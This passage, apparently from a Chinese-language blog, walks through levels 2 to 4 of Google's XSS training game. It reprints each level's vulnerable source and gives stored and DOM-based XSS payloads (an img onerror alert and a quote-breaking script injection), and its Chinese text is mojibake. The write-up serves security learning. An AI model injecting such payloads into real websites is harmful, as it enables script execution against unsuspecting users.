class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sign<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>Post-store.js</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">/* * Objects to implement a client-side post database. */</span> <span class="token keyword">function</span> <span class="token function">Post</span><span class="token punctuation">(</span><span class="token parameter">message</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>message <span class="token operator">=</span> message<span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>date <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">function</span> <span class="token function">PostDB</span><span class="token punctuation">(</span><span class="token parameter">defaultMessage</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// Initial message to display to users</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>_defaultMessage <span class="token operator">=</span> defaultMessage <span class="token operator">||</span> <span class="token string">""</span><span class="token punctuation">;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">setup</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> defaultPost <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Post</span><span class="token punctuation">(</span>defaultMessage<span class="token punctuation">)</span><span class="token punctuation">;</span>    window<span class="token punctuation">.</span>localStorage<span class="token punctuation">[</span><span class="token string">"postDB"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      <span class="token string">"posts"</span> <span class="token operator">:</span> <span class="token punctuation">[</span>defaultPost<span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">save</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">message<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> newPost <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Post</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> allPosts <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    allPosts<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>newPost<span class="token punctuation">)</span><span class="token punctuation">;</span>    window<span class="token punctuation">.</span>localStorage<span class="token punctuation">[</span><span class="token string">"postDB"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      <span class="token string">"posts"</span> <span class="token operator">:</span> allPosts    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">clear</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">getPosts</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>localStorage<span class="token punctuation">[</span><span class="token string">"postDB"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>posts<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>window<span class="token punctuation">.</span>localStorage<span class="token punctuation">[</span><span class="token string">"postDB"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>å…³é”®ä»£ç </p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>posts<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">var</span> html <span class="token operator">=</span> <span class="token string">'&lt;table class="message"> &lt;tr> &lt;td valign=top> '</span>            <span class="token operator">+</span> <span class="token string">'&lt;img src="/static/level2_icon.png"> &lt;/td> &lt;td valign=top '</span>            <span class="token operator">+</span> <span class="token string">' class="message-container"> &lt;div class="shim">&lt;/div>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">'&lt;b>You&lt;/b>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">'&lt;span class="date">'</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span>posts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>date<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;/span>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">"&lt;blockquote>"</span> <span class="token operator">+</span> posts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>message <span class="token operator">+</span> <span class="token string">"&lt;/blockquote"</span><span class="token punctuation">;</span> <span class="token comment">//è¿™è¿˜å°‘ä¸ª '>' 23333</span>          html <span class="token operator">+=</span> <span class="token string">"&lt;/td>&lt;/tr>&lt;/table>"</span>          containerEl<span class="token punctuation">.</span>innerHTML <span class="token operator">+=</span> html<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span></code></pre><p>å¯ä»¥å‘ç°æˆ‘ä»¬æäº¤çš„å†…å®¹è¾“å‡ºå­—æ®µä¼šè¢«<code>&lt;blockquote&gt;</code>åŒ…è£¹ï¼Œè€ƒè™‘åˆ°æ•°æ®æ˜¯å­˜å‚¨çš„æœåŠ¡å™¨ä¸Šçš„å¯ä»¥åˆ©ç”¨å­˜å‚¨å‹xssï¼Œåˆ©ç”¨<code>onerror</code>äº‹ä»¶æ¥è¿›è¡Œxss</p><blockquote><p>onerror äº‹ä»¶åœ¨è§†é¢‘/éŸ³é¢‘ï¼ˆaudio/videoï¼‰æ•°æ®åŠ è½½æœŸé—´å‘ç”Ÿé”™è¯¯æ—¶è§¦å‘ã€‚</p></blockquote><p>åˆ©ç”¨imgæ ‡ç­¾åŠ è½½ä¸€ä¸ªä¸å­˜åœ¨çš„å¯¹è±¡ï¼Œä¼šè§¦å‘onerroräº‹ä»¶</p><p>payloadï¼š</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">""</span> onerror<span class="token operator">=</span><span class="token string">"javascript:alert(1);"</span><span class="token operator">/</span><span class="token operator">></span></code></pre><p>ä»£ç å­˜è¿›äº†æœåŠ¡å™¨é‡Œï¼Œåªè¦åˆ·æ–°éƒ½ä¼šè§¦å‘</p><img src="/article/xss/image-20210424145306208.png" class="" title="level2-1" loading="lazy"><img src="/article/xss/image-20210424145406792.png" class="" title="level2-2" loading="lazy"><hr><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p><a href="https://xss-game.appspot.com/level3/frame#1">https://xss-game.appspot.com/level3/frame#1</a></p><p>æºç Â·index.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token comment">&lt;!-- Load jQuery --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span>      <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      <span class="token keyword">function</span> <span class="token function">chooseTab</span><span class="token punctuation">(</span><span class="token parameter">num</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Dynamically load the appropriate image.</span>        <span class="token keyword">var</span> html <span class="token operator">=</span> <span class="token string">"Image "</span> <span class="token operator">+</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        html <span class="token operator">+=</span> <span class="token string">"&lt;img src='/static/level3/cloud"</span> <span class="token operator">+</span> num <span class="token operator">+</span> <span class="token string">".jpg' />"</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#tabContent'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span>         window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash <span class="token operator">=</span> num<span class="token punctuation">;</span>         <span class="token comment">// Select the current tab</span>        <span class="token keyword">var</span> tabs <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'.tab'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> tabs<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>tabs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>id <span class="token operator">==</span> <span class="token string">"tab"</span> <span class="token operator">+</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            tabs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>className <span class="token operator">=</span> <span class="token string">"tab active"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            tabs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>className <span class="token operator">=</span> <span class="token string">"tab"</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>         <span class="token comment">// Tell parent we've changed the tab</span>        top<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">chooseTab</span><span class="token punctuation">(</span><span class="token function">unescape</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       <span class="token comment">// Extra code so that we can communicate with the parent page</span>      window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>source <span class="token operator">==</span> parent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">chooseTab</span><span class="token punctuation">(</span><span class="token function">unescape</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logo<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level3.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>Take a tour of our cloud data center.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab1<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>chooseTab(<span class="token punctuation">'</span>1<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Image 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab2<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>chooseTab(<span class="token punctuation">'</span>2<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Image 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab3<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>chooseTab(<span class="token punctuation">'</span>3<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Image 3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tabContent<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>å…³é”®ä»£ç </p><pre class="language-js" data-language="js"><code class="language-js">html <span class="token operator">+=</span> <span class="token string">"&lt;img src='/static/level3/cloud"</span> <span class="token operator">+</span> num <span class="token operator">+</span> <span class="token string">".jpg' />"</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#tabContent'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span>         window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash <span class="token operator">=</span> num<span class="token punctuation">;</span></code></pre><p><code>num</code>æ˜¯#åé¢çš„è¾“å…¥ï¼Œæ²¡æœ‰ç»è¿‡ä»»ä½•è¿‡æ»¤ï¼Œæ‰€ä»¥è®©å®ƒçš„imgæ ‡ç­¾é—­åˆï¼Œå†åŠ ä¸Šæˆ‘ä»¬çš„ä»£ç å³å¯</p><p><code>&lt;img src=&#39;/static/level3/cloud + num + .jpg&#39; /&gt;</code></p><p>å³å˜ä¸º<code>&lt;img src=&#39;/static/level3/cloud&#39;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;.jpg&#39; /&gt;</code></p><p>Payloadï¼š</p><pre class="language-js" data-language="js"><code class="language-js">'<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span></code></pre><img src="/article/xss/image-20210424150902973.png" class="" title="level3-1" loading="lazy"><img src="/article/xss/image-20210424150928175.png" class="" title="level3-2" loading="lazy"><hr><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p><a href="https://xss-game.appspot.com/level4/frame#">https://xss-game.appspot.com/level4/frame#</a></p><p>æºç Â·index.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level4.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>timer<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>timer<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Create timer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token 